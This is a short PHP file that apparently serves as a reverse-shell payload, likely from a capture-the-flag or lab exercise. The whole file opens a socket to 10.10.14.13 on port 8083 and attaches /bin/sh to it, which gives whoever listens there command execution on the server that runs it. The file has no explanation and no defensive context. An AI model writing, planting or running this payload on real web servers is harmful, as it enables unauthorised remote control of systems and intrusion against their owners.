<?php 
$ip = '10.10.14.13';
$port = 8083;
$fp = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [0 => $fp, 1 => $fp, 2 => $fp], $pipes);
?>
